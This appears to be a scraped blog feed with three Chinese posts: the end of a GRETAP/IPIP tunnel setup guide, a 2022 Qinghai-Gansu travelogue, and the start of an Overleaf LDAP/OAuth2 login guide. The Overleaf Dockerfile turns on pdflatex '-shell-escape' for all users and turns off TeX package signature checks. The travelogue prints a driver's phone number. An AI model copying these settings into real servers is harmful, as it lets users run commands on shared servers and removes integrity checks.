如要让Debian一侧的IPIP和GRETAP隧道开机自启，可以用systemd在开机时运行以下脚本：\n/root/gretap-spark.sh：\n#modprobe modprobe ip_gre modprobe ipip #ipip tunnel ip tunnel add ipip2 local 10.20.2.223 remote 10.16.212.255 ip link set ipip2 up ip addr add 6.0.0.1/24 dev ipip2 # gretap tunnel ip link add name gretap1 type gretap remote 6.0.0.2 local 6.0.0.1 ip link set gretap1 up mtu 1420 # bridge ip link add grebr0 type bridge ip link set ens224 master grebr0 ip link set gretap1 master grebr0 ip link set grebr0 up dhclient -i ens224 -4 /lib/systemd/system/gre-and-ipip-tunnel.service：\n[Unit] Description=bring up gretap tunnel After=network-online.target [Service] Type=simple User=root ExecStartPre=/bin/sh -c \u0026#39;until ping -c1 1.2.4.8; do sleep 1; done;\u0026#39; ExecStart=/bin/bash /root/gretap-spark.sh [Install] WantedBy=multi-user.target 通过隧道分配IP IPv4 在Openwrt上新建一个interface，名字叫dhcpgretap4，Protocal选择dhcp client，Device选择gre4t-gretap1（默认可能不提供这个选项，可能需要在最下面手动输入），并勾选Use default gateway，防火墙划分到WAN区。\n如果不特别配置的话，隧道接口的MAC地址每次重启都会变化（这是由于gretap这个接口没办法固定mac导致的），openwrt似乎没发直接固定这个地址。变通的方案可以在network - device界面创建一个bridge（如grebr），然后给bridge配置v6地址，再将前面dhcpgretap4的Device指定到grebr上，此时dhcpgretap4的MAC就被固定成那个bridge的地址了。 IPv6 把WAN6的接口改为gre4t-gretap1（可能也需要手动输入）即可。\n全部配置完成后，dhcpipip4和wan6的interface理论上均能取得上级路由器（ikuai）分配的IP。\n性能 有线下iperf3测速可达800Mbps，无线下可达500Mbps。速度相比EoIP协议的内层隧道已有明显改善。\n参考资料 https://forum.openwrt.org/t/howto-l2-trunk-over-wifi-with-gretap/75689 https://david-waiting.medium.com/a-beginners-guide-to-generic-routing-encapsulation-fb2b4fb63abb ","permalink":"https://blog.sparktour.me/posts/2022/09/18/openwrt-linux-layer2-network-with-ipip-and-gretap-tunnel/","summary":"\u003cp\u003e在\u003ca href=\"/posts/2022/09/18/openwrt-mikrotik-layer2-network-with-ipip-and-eoip-tunnel/\"\u003e前一篇文章中\u003c/a\u003e，笔者尝试了用Openwrt和RouterOS配合IPIP和EoIP隧道进行二层组网。但由于Openwrt的EoIP包是一个\u003ca href=\"https://forum.openwrt.org/t/please-add-2-new-packages-for-eoip/57113\"\u003e用户态的包\u003c/a\u003e，AX6s转发EoIP流量的性能并不是特别好（有线500Mbps，无线300Mbps），同时RouterOS也是一个收费系统，并不是所有人都会只为了组网来购买RouterOS的授权。鉴于此，笔者也在下文提供一种将IPoE替换为GRETAP协议进行二层组网的方案，此方案仅需一台运行于实验室内网的通用Linux设备即可（本文使用的是Debian11）。\u003c/p\u003e\n\u003c!-- more --\u003e\n\u003chr\u003e\n\u003ch2 id=\"gretap\"\u003eGRETAP？\u003c/h2\u003e\n\u003cp\u003e相比于GRE，GRETAP是类似EoIP的二层协议，因此我们同样可以将其用于二层组网。但很可惜\u003ca href=\"https://forum.mikrotik.com/viewtopic.php?t=160484\"\u003eRouterOS不支持GRETAP\u003c/a\u003e（怀疑是为了推广自家的EoIP协议），因此笔者只能使用另一台Linux设备和Openwrt路由器进行组网了。\u003c/p\u003e\n\u003ch2 id=\"网络结构\"\u003e网络结构\u003c/h2\u003e\n\u003cp\u003e此处依然简要列出一下代配置的网络结构：\u003c/p\u003e","title":"Openwrt 和通用Linux设备通过 IPIP/GRETAP 进行二层组网"},{"content":"「动态清零」下的毕业旅行——青甘大环线 笔者的毕业旅行最早是在2021年末就有了初步的想法，不过当时是去上海和浙江附近玩一圈，但随着上海的封控和各地区的加码，在22年4-5月时，大部分城市都要求所在区有一例COVID-19确诊就就要求原地隔离，我们一度认为毕业旅游的计划可能已经泡汤了，不过随着6月国务院提出了「九不准」（具体对我们的旅行有影响的是「不准随意将限制出行的范围由中、高风险地区扩大到其他地区；不准对来自低风险地区人员采取强制劝返、隔离等限制措施；」两条），各地的入境政策有所放松。于是我们于6月初逐步定下了前往西藏旅游的计划。不过随着6月18日左右深圳再次出现新增，为了避免不必要的麻烦，我们最终选择了在当时防控政策较为宽松的青海和甘肃进行旅行。随着第九版诊疗方案的发布，方案也明确了「不允许对低风险地区入市人员进行隔离」，我们最终确认了毕业旅行的方案——包车行走一次青海-甘肃环线。\n行程卡 本文含有嵌入的Google Mymaps和高德地图。其中，Google Mymaps可能需要合适的网络环境才能正常显示，高德地图则可能需要关闭某些广告屏蔽软件才能正常显示。 地图 行前准备 我们一行一共5人，于马蜂窝上找了一个旅行社，按照他们的参考路线包了7天的七人车（也就是行程里的D3-D9）（行程链接，包车的师傅说也可以找他直接包，比旅行团的价格便宜，张师傅电话：13897503462，可加微信），车型是上汽大通G10 Plus，车龄3年左右。\n高原反应 西宁的海拔大概2500左右，整个旅程会长期停留的最高的地方在茶卡盐湖，海拔略高于3000米，如果怕有高原反应的话可以参考这个回答买一点乙酰唑胺（在香港这个药就直接叫「海拔适」，不过需要自己阅读说明书，以及笔者吃了之后有一点手指麻木的副作用；而广为流传的药物红景天似乎没啥作用，最后还导致了跟我们一起同行的人吐了）。\n航拍无人机 青海的大部分景点都可以飞，甘肃的大部分景点都明确不能飞，但实际上甘肃的景点里也有人飞，但没人管，估计是人太少了，保安懒得管吧。\n行程规划 由于在我们出发前，西宁依旧要求有确诊的区的人来西宁需要「三天两检」因此我们在西宁多安排了一天，以防可能的加码措施，同时这样安排也能让我们在D2单独去一下塔尔寺再回西宁市区。\n在出发时，我们还安排了在青海甘肃环线后前往兰州再旅游3天，不过由于兰州于7月8日后出现了较多的新增，为避免封控，我们最后决定直接从西宁返回，最后也在西宁机场附近定了一个酒店，绕过了西宁市区。\nD1 西宁 第一天上午到达了西宁机场，做了落地核酸，下午一两点打车到了民宿。机场的到达人很少（也许是上午的缘故），门外做核酸的地方也一度只有10人以内排队。\n飞机上 西宁机场高速入口，过了收费站有人要求非西宁车牌的人做核酸 第一天下午吃完午饭后去了青海省博物馆，主要的展览内容当然就是青海省内各个朝代的文物，影响比较深的是青海这边可能是因为比较干燥和多沙，早至汉代甚至战国都有完整的陶器留下。\n青海省博物馆 展览序言 下午坐公交去到了南山公园（西宁的公交支持交通联合和银联卡），山不太高，但由于西宁的楼普遍不高，在山上就能看到西宁的全景了。\n南山公园旁的一个广告墙 山顶看到的西宁市区 D1的天气很不错，天基本都是蓝的，可惜后面似乎是因为浮沉的原因，整个环线上的天气就没这么蓝了。\n凤凰亭 晚上在民宿老板的推荐下去吃了伊福德炕肉，主营的菜是坑锅羊/牛/鸡肉，做法大致就是把肉，土豆和粉条在锅里烧到收汁。值得一提的是，西宁和甘肃的餐馆里还常见个名为「大窑汽水」的汽水系列，有橙汁，荔枝，原味等味道的汽水。其中橙味的汽水味道类似于芬达，荔枝味的就是常见的荔枝饮料的味道，原味的汽水同行的人都说喝起来像是感冒药。。。\n饭后还顺便尝了一下青海老酸奶（奶皮是黄色的那种），不过原味的酸奶实在是太酸了，那种改良过的，制作过程中加了糖的酸奶我们倒是还比较能接受。\n青海老酸奶 健康码 青海用的健康码名为「信用健康码」，听起来像是把防疫工作和个人信用混到了一起，听起来有点怪怪的。不过相比于广东的健康码，青海的码支持支付宝微信云闪付，相比广东的健康码和微信强绑定要好一些。进入景区一般需要扫场所码，相比之下餐饮和小商店就管的不太严，不会强制你扫。\nD2 塔尔寺 莲湖公园 塔尔寺 塔尔寺距离西宁市区大概有30km左右，说远不远，说近不近。这导致我们要去基本就只能去一整天。因此我们这天租了一辆车去了塔尔寺和附近的莲湖公园。\n在塔尔寺我们找了景区官方的讲解（5人是160，大概1.5-2h），讲解的大叔讲得很细心，体验很好。临讲解完我们还问了讲解的大叔旁边的藏文化博物馆值不值得去，他说没啥意思，于是我们就直接跳过了。\n塔尔寺门口的八塔，可以看到游客不是很多 菩提树 莲湖公园 看完塔尔寺之后我们去旁边的县城吃了午饭，随意选了个「湟中区鲁沙尔万聚火锅」，品质还行。饭后去了旁边的莲湖公园，莲湖本质是个水库，不过太阳还是太晒了，上到大坝上不到10分钟就被热回车里了。\n莲湖水库的大坝和湖 车上看到的日落 晚饭去了伊然轩茶餐厅。这边比较有特色的是沙葱炒蛋和盖碗茶，沙葱吃起来有点像没有味道的茼蒿的味道，个人感觉还行；盖碗茶就是加了红枣枸杞白糖的绿茶，喝起来比较甜。\nD3 青海湖 包车师傅的大通MPV 第三天早上包车的师傅接上了我们，开始了七天的包车旅程。上午去的是青海湖，先去了青海湖边的一个私人景点，有一些油菜花和薰衣草，收费40/人。不管天气的话，拍照的效果还是不错的。\n青海湖的拱门 私人景点里的油菜花（左侧），右侧看起来尴尬种起来，正在长 航拍的效果，后面是青海湖 湖边的牦牛（给人拍照用的） 之后去了二郎剑景区，景区里的主要游览项目是坐船在湖里转一圈（大概10km），但同行的人觉得没啥意思就没去。湖边倒还是挺好看的。\n二郎剑的石碑 湖边，远处有个水雷测试基地 湖边的鸟 中午在景区吃的德克士（价格大概是普通门店的1.2-2.5倍），后来发现青海和甘肃的大景点里基本每个景点都有一个德克士，二郎剑景区里甚至还有一个蜜雪冰城。\nD2的下午主要就是赶路到茶卡镇（茶卡盐湖旁边）。\n过马路的牦牛 经过的最高的地方是橡皮山，海拔3817m。\n橡皮山 从这之后，行程中的早中晚饭基本都是包车师傅吃啥我们就吃啥。D2的晚饭是在茶卡镇上的应财特色小炒坑锅肉，司机推荐我们点了菜单上没有的羊肉抓饭，便宜大碗。其他的羊肉和牛肉也还不错。\n抓饭 日落（青海甘肃的日落很晚，大概晚上八点半才日落） D4 茶卡盐湖 翡翠湖 茶卡盐湖 茶卡盐湖原来是是个盐业工业基地，大约是在2015年左右因为盐湖的白色景观火起来的。（顺带一提，茶卡盐湖在我们玩完后几天还因为观光车的收费问题被媒体曝光过，结果是景区取消了进入景区的30元观光车车票）\n盐湖可以下湖，推荐购买火车票和鞋套的套票（108的那个），小火车的运行范围大概就是上面地图里伸出来的那段类似于堤坝的结构。由于盐是白色的，会反射阳光，就算是像下图这样的阴天，现场的光线也都很强烈。带个太阳镜过去会更加舒服一些。\n盐湖的堤坝也是拿盐做的 小火车道口 小火车 盐湖上过饱和析出的盐 废弃的电线杆 废弃的铁轨 工业火车 翡翠湖 午饭后下午的行程主要就是赶路到大柴旦，并且游览大柴旦旁边的翡翠湖。翡翠湖也是一个盐湖，不过可能是由于湖内有一些矿物质，翡翠湖的湖水更加偏绿或蓝一些。我们到翡翠湖的时候已经快八点了，光线比较柔和，如果只拍湖的话效果都很不错（由于天的浮尘比较严重，就算是日落的时候天空也比较惨白）。 翡翠湖，这边的湖水较深，盐相比茶卡的较少一些，旁边的路基还是以土质为主 绿色的盐湖 盐湖的纹理 盐溶洞，上面覆盖的是过饱和析出的盐 翡翠湖的航拍，颜色更明显了 全景图，似乎盐度更高的湖是绿色的，盐度低一些的是蓝色的 「外星人遗址」 晚饭是在大柴旦的雅古拜生烤羊肉吃的，有一些烧烤和坑锅。\nD5 U形公路 水上雅丹 雅丹地貌 U形公路 这一天的路线是个环线，晚上依然住在大柴旦。我们首先是经过了U形公路，大致就是一个垂直方向非常弯曲的公路，似乎也是因为小红书等平台火起来的，实拍图大概长这样： U形公路 U形公路，手机拍的更广的角度 近看的话，还能发现很多胆子大的游客直接站在公路中间拍照，许多大货车可能被吓怕了，经过这一段的时候一直在鸣笛（非常恐怖兄弟.webp）。\n胆子大的游客 水上雅丹 水上雅丹顾名思义就是雅丹地貌+水，水的来源似乎是因为附近的河流改道造成的。由于没有出方向的河流，水上雅丹也算是一个咸水湖，颜色和翡翠湖一样都是淡蓝色的。\n雅丹地貌，可以看到被水侵蚀的比较严重 船和背后的雅丹地貌 水上雅丹和水里的船，可以看到天气不是很好，虽然是晴天，但蓝天都看不到 全景 雅丹地貌 就是陆地上的雅丹地貌，在回程的S314上随处可见。\n雅丹地貌 由于下一日要进入甘肃，因此我们在D5下午在大柴旦人民医院做了一次核酸，混检5元。\n大柴旦人民医院门口做核酸的队伍，当时等了快半小时 D6 大柴旦-敦煌 阳关 《又见敦煌》演出 这一天的白天都是赶路，主要是路上看看风景。\n公路上的骆驼 G215穿过当金山 阳关 阳关门口长达7页纸的「中高风险区」 下午到达敦煌后去了阳关，阳关景区除了几个烽火台遗址之外，都是新建的建筑：\n新建的建筑部分 烽火台遗址 阳关故址碑，后面就是沙漠了 《又见敦煌》演出 晚上去看了《又见敦煌》（非官方介绍网页）演出，一般找包车的司机或者当地的出租车司机，能买到比票面价格优惠一些的票。（敦煌有三个演出：《丝路花雨》，《又见敦煌》，《敦煌盛典》，小红书上能找到一些对比这三个演出的帖子，比如这个，或者这个知乎问题。\n🌸丝路花雨\n丝路花雨开发时间早，在1989年的时候就已经很成功了，在当时社会打造这样的舞台剧绝对是难得，当时的新闻对这个剧的评价也是很高的。舞台主要以唐朝为背景，以丝绸之路和敦煌壁画为素材打造。故事讲述了英娘和画工神笔张父女的悲欢离合的故事，高度颂扬了中国和西域人民的源远流长的友谊。丝路花雨从出现到至今已经表演了3000场左右，观看人数超过了400万人，被誉为东方的天鹅湖。在08年的北京奥运会，09年的60国庆，10年的世博会都有演出。\n地址：甘肃省敦煌市文博东路2713号敦煌大剧院\n交通：建议大家乘坐剧院的摆渡车，具体等候的地点和时间可以在购票的时候询问。从敦煌市区打车过去车费20元。演出时间20:30、演出时长80分钟。\n🌸又见敦煌\n又见敦煌是一个比较新的节目，2016年正式开演，这个节目从一出生就带主角光环，以王潮歌导演作为噱头，大力宣传。演出被分成了三个不同的戏剧空间，需要走动观看，每个空间即为一幕。演员就在观众的旁边进行演出，是很独特的体验，让游客了解敦煌文化。\n整个表演以真实历史为题材，演出方式与观演形式都增加了大家的欣赏和趣味性。\n演出地址：莫高窟数字中心西侧又见敦煌剧场\n演出时长90分钟，淡季每天1场，晚8. 旺季全天都有，20:00—21:30是固定场。门票全国统一价。\n🌸敦煌盛典\n敦煌盛典是一出以爱情为主线的实景演出，通过演员的表演重现另外敦煌重镇的历史文化和人文风貌。演出分6个篇章《序·大漠魂》第一幕《禅定·鸣沙山》第二幕《远走·敦煌城》第三幕《情牵·莫高窟》第四幕《婵娟·月牙泉》《尾声·梦敦煌》。\n敦煌盛典演出在室外，且有3D灯光效果，很震撼。配360度旋转且前后移动的观众席，这在现在也是很少见的场景布置。\n地址：敦月路敦煌山庄向内200米，距离敦煌市区4公里。\n🌛最后 到底该如何选择❓\n首先是门票区别，又见敦煌演出场景形式新颖，全新搭建。和其它两个演出门票相差仅有几十元。距离方面，三个演出都在景区附近，距离不是问题。演出类型方面，丝路花雨是纯的舞台剧，以友情和亲情为主，又见敦煌是历史故事的展现，敦煌盛典则是爱情故事为主，看个人偏好哪种类型\n—— https://www.xiaohongshu.com/discovery/item/606ee42e0000000001029e0a\n《又见敦煌》这个演出比较新（似乎是始于2016年的），演出场地位于莫高窟游客集散中心的对面。比较新颖的地方在于将演出分成了四幕，分别用了不同的表演空间，同时观看的人士是站在舞台下，可以随着剧情随意走动的。不过身边的朋友有反馈说这个剧的台词太煽情了一些，令人听了有些起鸡皮疙瘩。\n第一幕，观众环绕着一个T台 第一幕 第二幕，一个参考莫高窟建的墙 第三幕，透过玻璃看上下方的古装场景 第四幕，比较偏向于春晚的那种传统表演 D7 莫高窟 鸣沙山 莫高窟 莫高窟需要提前订票才有机会买到能看八个洞窟和数字电影的票，否则就只能买看只能看四个洞窟的应急票了。一般来说需要提前30天购票，本次旅行因为甘肃的疫情管控和人很少的原因，我们在提前10天左右就买到了票。订票只能去 https://www.mgk.org.cn/ticket 定。 我们于D7的上午和中午去了莫高窟，进入游客中心后首先会让游客看一个普通的电影和一个球幕电影。普通的电影是一个讲述莫高窟历史的纪录片，拍的不错但年代有些久远，航拍拿的还是直升机拍摄的，因此画面比较摇晃。球幕电影则是基于莫高窟的3D扫描模型带着游客导览了几个洞窟。\n看完电影后大巴将我们送至了景区内部，莫高窟的洞窟内部不允许拍照，因此下面的照片都是莫高窟悬崖的外景。（内景可以去莫高窟官方开发的「数字敦煌」网站上去看）\n莫高窟崖壁 莫高窟 莫高窟中段第96窟外的窟檐（同样的，天气不是很好，所以天只是淡蓝色的） 鸣沙山月牙泉 鸣沙山和月牙泉位于同一个景区内，景区给鸣沙山铺设了木梯子，可以沿着爬上去（踩着沙也可以爬，但很累）如果下午去的话，可以在山顶看到日落。\n鸣沙山的沙丘 鸣沙山和景区内的一些付费项目：骆驼，动力滑翔伞，越野车和直升机 鸣沙山月牙泉日落时的全景 日落后亮灯的月牙泉 晚上的月牙泉 从山上下来就快十点钟了，晚上11点还去了一下沙洲夜市，客流恢复的还不错。\n沙洲夜市 D8 张掖 七彩丹霞 我们从D8开始经甘肃回程，由于兰州的新增持续增多，这一路上的防疫查验也开始严格了起来，离开酒泉被要求做了一次核酸，然后在每个市界都被要求看了一次行程码和健康码。\n七彩丹霞 七彩丹霞为丹霞地貌群，因为断层的颜色不同，所以在阳光的照射下会显现很「七彩」的颜色，但可惜我们来的时候没有阳光，所以照片的效果就比较平淡了。\n七彩丹霞 七彩丹霞 七彩丹霞 D9 门源油菜花 祁连山 返回西宁机场 D9也是处于返回西宁的途中，中间经过了门源，有一些油菜花田可以看：\n油菜花田 从达坂山上看到的油菜花 正在建设中的扁门高速 公路上的羊群 G227国道的盘山公路 省界防疫检查站 最后在甘肃和青海的省界上，甘肃方设置了两个检查站，一个检查健康码，一个检查核酸。由于检查站直接设置在了路面上，路边也没有充足的停车的地方，因此我们在两个检查站分别排了一个小时的队。最后晚上到达西宁机场附近的酒店的时候已经是晚上十点左右了。七天的包车旅程也到此结束了。\n省界做核酸的检查站 因做核酸和查健康码造成的排队车流 后记 想起来在旅行的过程中，笔者因为发现客流较数年前来西北旅游的时候少，问了许多当地人今年的客流量（这些人包括但不限于西宁，敦煌的出租车司机，包车的师傅，塔尔寺的讲解导游一些餐厅的老板等），看起来严苛的管控政策已经成为了大家跨省旅游的阻碍。另外在政策方面，尽管国务院提出了「九不准」，我们在路上依然遇到了要求做个核酸才能走，跨省核酸就不认等等这种「加码」。希望明年不要再出现这些情况，让我们能够从容安排旅游，而不受这些突如其来的政策影响吧。\n","permalink":"https://blog.sparktour.me/posts/2022/07/18/qinghai-gansu-trip-2022/","summary":"\u003ch1 id=\"动态清零下的毕业旅行青甘大环线\"\u003e「动态清零」下的毕业旅行——青甘大环线\u003c/h1\u003e\n\u003cp\u003e笔者的毕业旅行最早是在2021年末就有了初步的想法，不过当时是去上海和浙江附近玩一圈，但随着\u003ca href=\"https://zh.wikipedia.org/wiki/2022%E5%B9%B43%E6%9C%88%E4%B8%8A%E6%B5%B7%E5%B8%822019%E5%86%A0%E7%8A%B6%E7%97%85%E6%AF%92%E7%97%85%E8%81%9A%E9%9B%86%E6%80%A7%E7%96%AB%E6%83%85\"\u003e上海的封控\u003c/a\u003e和各地区的加码，在22年4-5月时，大部分城市都要求所在区有一例COVID-19确诊就就要求原地隔离，我们一度认为毕业旅游的计划可能已经泡汤了，不过随着6月国务院提出了「\u003ca href=\"http://www.gov.cn/xinwen/2022-06/25/content_5697778.htm\"\u003e九不准\u003c/a\u003e」（具体对我们的旅行有影响的是「不准随意将限制出行的范围由中、高风险地区扩大到其他地区；不准对来自低风险地区人员采取强制劝返、隔离等限制措施；」两条），各地的入境政策有所放松。于是我们于6月初逐步定下了前往西藏旅游的计划。不过随着6月18日左右深圳再次出现新增，为了避免不必要的麻烦，我们最终选择了在当时防控政策较为宽松的青海和甘肃进行旅行。随着\u003ca href=\"http://www.gov.cn/xinwen/2022-03/15/content_5679258.htm\"\u003e第九版诊疗方案\u003c/a\u003e的发布，方案也明确了「不允许对低风险地区入市人员进行隔离」，我们最终确认了毕业旅行的方案——包车行走一次青海-甘肃环线。\u003c/p\u003e\n\u003cp\u003e\u003cfigure\u003e\n    \u003cimg loading=\"lazy\" src=\"https://assets.sparktour.me/img/blog/2022/qinghai-gansu-trip-2022/74_xingchengka.PNG\" alt=\"行程卡\"  /\u003e\n    \u003cfigcaption\u003e行程卡\u003c/figcaption\u003e\n\u003c/figure\u003e\n\u003c/p\u003e\n\u003c!-- more --\u003e\n\n \n\u003cdiv class=\"callout callout-info\"\u003e\n    本文含有嵌入的Google Mymaps和高德地图。其中，Google Mymaps可能需要合适的网络环境才能正常显示，高德地图则可能需要关闭某些广告屏蔽软件才能正常显示。\n\u003c/div\u003e\n\n\u003ch2 id=\"地图\"\u003e地图\u003c/h2\u003e\n\u003ciframe src=\"https://www.google.com/maps/d/u/0/embed?mid=1SDA3mW6-TvFf1ak6mrRfQvYzd1jHKUk\u0026ehbc=2E312F\" width=\"100%\" height=\"480\"\u003e\u003c/iframe\u003e\n\u003ch2 id=\"行前准备\"\u003e行前准备\u003c/h2\u003e\n\u003cp\u003e我们一行一共5人，于马蜂窝上找了一个旅行社，按照他们的参考路线包了7天的七人车（也就是行程里的D3-D9）（\u003ca href=\"https://www.mafengwo.cn/sales/327915.html\"\u003e行程链接\u003c/a\u003e，\u003cstrong\u003e包车的师傅说也可以找他直接包，比旅行团的价格便宜，张师傅电话：13897503462，可加微信\u003c/strong\u003e），车型是\u003ca href=\"https://www.saicmaxus.com/g10.shtml\"\u003e上汽大通G10 Plus\u003c/a\u003e，车龄3年左右。\u003c/p\u003e","title":"「动态清零」下的毕业旅行——青甘大环线"},{"content":" 效果图 既去年给自部署Overleaf实例添加了邮箱注册功能之后，最近在TUNA的同学的帮助下，笔者也为南科大的Overleaf实例添加了LDAP登录和OAuth2/OpenID Connect登录的选项，进一步减少了用户登录Overleaf时需要的步骤。由于加上了外部的单点登录，学校的Overleaf也就不再需要邮件注册的功能了，因此本文将不再提及如何启用邮件注册，如需了解可以看笔者之前写的文章。\n2024年3月更新 ldap-overleaf-sl已参考本文合并oauth2相关的修改，如需在版本4以上的overleaf适配oauth/ldap登陆，请参考他们的repo进行操作。如在内地网络环境下遇到下载缓慢，pygments可执行包找不到等问题，可以替换ldap-overleaf-sl/Dockerfile （https://mirrors.sustech.edu.cn/git/sustech-cra/overleaf-ldap-oauth2/-/blob/ldap-overleaf-sl/ldap-overleaf-sl/Dockerfile）为以下的修改版：\n点此展开Dockerfile FROM sharelatex/sharelatex:4.2.0 # FROM sharelatex/sharelatex:latest # latest might not be tested # e.g. the AuthenticationManager.js script had to be adapted after versions 2.3.1 LABEL maintainer=\u0026#34;Simon Haller-Seeber\u0026#34; LABEL version=\u0026#34;0.1\u0026#34; # passed from .env (via make) ARG collab_text ARG login_text ARG admin_is_sysadmin # set workdir (might solve issue #2 - see https://stackoverflow.com/questions/57534295/) WORKDIR /overleaf/services/web # change apt source RUN sed -i s@/archive.ubuntu.com/@/mirrors.sustech.edu.cn/@g /etc/apt/sources.list RUN sed -i s@/security.ubuntu.com/@/mirrors.sustech.edu.cn/@g /etc/apt/sources.list RUN tlmgr option repository https://mirrors.sustech.edu.cn/CTAN/systems/texlive/tlnet # install latest npm RUN npm install -g npm --registry=https://registry.npmmirror.com \u0026amp;\u0026amp; \\ ## clean cache (might solve issue #2) # npm cache clean --force \u0026amp;\u0026amp; \\ npm install ldap-escape ldapts-search ldapts@3.2.4 --registry=https://registry.npmmirror.com \u0026amp;\u0026amp; \\ # npm install bcrypt@5.0.0 \u0026amp;\u0026amp; \\ apt-get update \u0026amp;\u0026amp; \\ apt-get -y install libxml-libxslt-perl cpanminus libbtparse2 python-pygments \u0026amp;\u0026amp; \\ # now install latest texlive2023 from tlmgr tlmgr update --self --all \u0026amp;\u0026amp; \\ tlmgr install scheme-full --verify-repo=none # fonts RUN apt-get -y install fonts-noto-cjk fonts-noto-cjk-extra fonts-noto-color-emoji xfonts-wqy fonts-font-awesome # flush font cache RUN fc-cache -fv # pip and pygments fix RUN apt-get -y install python3-pip RUN pip3 config set global.index-url https://mirrors.sustech.edu.cn/pypi/web/simple RUN pip3 install Pygments # latex-bin must be on path to be found in compilation process # needed for biber epstopdf and others ENV PATH=\u0026#34;/usr/local/texlive/2023/bin/x86_64-linux:${PATH};\u0026#34; # overwrite some files COPY sharelatex/AuthenticationManager.js /overleaf/services/web/app/src/Features/Authentication/ COPY sharelatex/AuthenticationController.js /overleaf/services/web/app/src/Features/Authentication/ COPY sharelatex/ContactController.js /overleaf/services/web/app/src/Features/Contacts/ COPY sharelatex/router.js /overleaf/services/web/app/src/router.js # Too much changes to do inline (\u0026gt;10 Lines). COPY sharelatex/settings.pug /overleaf/services/web/app/views/user/ COPY sharelatex/login.pug /overleaf/services/web/app/views/user/ COPY sharelatex/navbar.pug /overleaf/services/web/app/views/layout/ COPY sharelatex/navbar-marketing.pug /overleaf/services/web/app/views/layout/ # Non LDAP User Registration for Admins COPY sharelatex/admin-index.pug /overleaf/services/web/app/views/admin/index.pug COPY sharelatex/admin-sysadmin.pug /tmp/admin-sysadmin.pug ## comment out this line to prevent sed accidently remove the brackets of the email(username) field # sed -iE \u0026#39;/email@example.com/{n;N;N;d}\u0026#39; /overleaf/services/web/app/views/user/login.pug \u0026amp;\u0026amp; \\ RUN sed -iE \u0026#34;s/email@example.com/${login_text:-user}/g\u0026#34; /overleaf/services/web/app/views/user/login.pug \u0026amp;\u0026amp; \\ ## Collaboration settings display (share project placeholder) | edit line 146 ## share.pug file was removed in later versions # sed -iE \u0026#34;s%placeholder=.*$%placeholder=\\\u0026#34;${collab_text}\\\u0026#34;%g\u0026#34; /overleaf/services/web/app/views/project/editor/share.pug \u0026amp;\u0026amp; \\ ## extend pdflatex with option shell-esacpe ( fix for closed overleaf/overleaf/issues/217 and overleaf/docker-image/issues/45 ) ## do this in different ways for different sharelatex versions sed -iE \u0026#34;s%-synctex=1\\\u0026#34;,%-synctex=1\\\u0026#34;, \\\u0026#34;-shell-escape\\\u0026#34;,%g\u0026#34; /overleaf/services/clsi/app/js/LatexRunner.js \u0026amp;\u0026amp; \\ sed -iE \u0026#34;s%\u0026#39;-synctex=1\u0026#39;,%\u0026#39;-synctex=1\u0026#39;, \u0026#39;-shell-escape\u0026#39;,%g\u0026#34; /overleaf/services/clsi/app/js/LatexRunner.js \u0026amp;\u0026amp; \\ if [ \u0026#34;${admin_is_sysadmin}\u0026#34; = \u0026#34;true\u0026#34; ] ; \\ then cp /tmp/admin-sysadmin.pug /overleaf/services/web/app/views/admin/index.pug ; \\ else rm /tmp/admin-sysadmin.pug ; \\ fi # This seems to be fixed in Sharelatex 4. # \u0026amp;\u0026amp; \\ # rm /overleaf/services/web/modules/user-activate/app/views/user/register.pug \u0026amp;\u0026amp; \\ ### To remove comments entirly (bug https://github.com/overleaf/overleaf/issues/678) #rm /overleaf/services/web/app/views/project/editor/review-panel.pug \u0026amp;\u0026amp; \\ #touch /overleaf/services/web/app/views/project/editor/review-panel.pug ### Nginx and Certificates # enable https via letsencrypt # RUN rm /etc/nginx/sites-enabled/sharelatex.conf # COPY nginx/sharelatex.conf /etc/nginx/sites-enabled/sharelatex.conf # get maintained best practice ssl from certbot # RUN wget https://raw.githubusercontent.com/certbot/certbot/master/certbot-nginx/certbot_nginx/_internal/tls_configs/options-ssl-nginx.conf -O /etc/nginx/options-ssl-nginx.conf \u0026amp;\u0026amp; \\ # wget https://raw.githubusercontent.com/certbot/certbot/master/certbot/certbot/ssl-dhparams.pem -O /etc/nginx/ssl-dhparams.pem # reload nginx via cron for reneweing https certificates automatically # COPY nginx/nginx-reload.sh /etc/cron.weekly/ # RUN chmod 0744 /etc/cron.weekly/nginx-reload.sh ## extract certificates from acme.json? # COPY nginx/nginx-cert.sh /etc/cron.weekly/ # RUN chmod 0744 /etc/cron.weekly/nginx-cert.sh \u0026amp;\u0026amp; \\ # echo \u0026#34;/usr/cron.weekly/nginx-cert.sh 2\u0026gt;\u0026amp;1 \u0026gt; /dev/null\u0026#34; \u0026gt; /etc/rc.local \u0026amp;\u0026amp; \\ # chmod 0744 /etc/rc.local 修改后，按照ldap-overleaf-sl的指引在一级目录里运行make，得到docker镜像，并替换overleaf toolkit中的docker镜像即可。\n如果需要了解如何给Overleaf加上邮件自注册的话，请参考 https://sparktour.me/2021/04/02/self-host-overleaf/ 这篇文章。 本文使用的LDAP服务软件是OpenLDAP，Oauth2服务软件是Keycloak。两者通过keycloak的User Federation功能互联。如果您使用的是这两者之外的LDAP或者OAuth/OpenID Connect服务软件的话，请根据自己的情况自行微调配置。 认证系统结构 如下图所示，在本文中只需要注意OpenLDAP，Keycloak和Sharelatex部分即可。\nauth-flow 基本思路 （如果不想看这段可以直接跳到后文的「安装」部分）\n由于Overleaf的认证和用户注册函数都在 https://github.com/overleaf/overleaf/tree/main/services/web/app/src/Features/Authentication 这个文件夹下面，因此实现LDAP和Oauth的方法基本都是魔改这个文件夹里的AuthenticationController.js和AuthenticationManager.js。\nLDAP 参考 https://github.com/smhaller/ldap-overleaf-sl。\n主要就是引入了ldapts这个依赖，处理了LDAP第一次登录sharelatex时的注册问题，以及LDAP登录的时候如何验证LDAP用户邮箱和密码的流程。\nOAuth2 参考TUNA的思路，同样是添加一个函数处理OAuth用户第一次登录sharelatex时的注册问题，同时在AuthenticationController.js里加上用户处理OAuth重定向和OAuth回调的函数，同时还要注意把这两个函数对应的router加到router.js里。由于Overleaf在近期的版本里把axios删掉了，因此还要自己添加一个Axios依赖。\nkeycloak有一些奇妙的特性（bug），如果出了莫名其妙的问题的话，可以参考这篇文章用常用的api测试工具走一遍流程验证一下问题出现在哪里（此条也适用于其他的OAuth服务器）。\n处理回调的函数大致如下，熟悉OAuth2的流程的话，可以根据自己的认证软件逻辑修改：\noauth2Redirect(req, res, next) { res.redirect(`${process.env.OAUTH_AUTH_URL}?` + querystring.stringify({ client_id: process.env.OAUTH_CLIENT_ID, response_type: 